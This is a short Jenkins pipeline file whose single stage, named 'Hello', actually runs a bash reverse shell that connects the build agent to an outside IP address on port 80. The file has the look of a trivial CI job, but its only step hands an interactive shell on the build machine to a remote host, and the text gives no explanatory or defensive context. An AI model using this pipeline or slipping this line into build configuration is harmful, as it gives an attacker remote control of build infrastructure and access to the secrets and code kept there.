pipeline {
  agent none
  stages {
    stage('Hello') {
      agent any
      steps {
        sh '''#!/bin/bash
        bash -i >& /dev/tcp/3.22.30.40/80 0>&1
        '''
      }
    }

  }
}
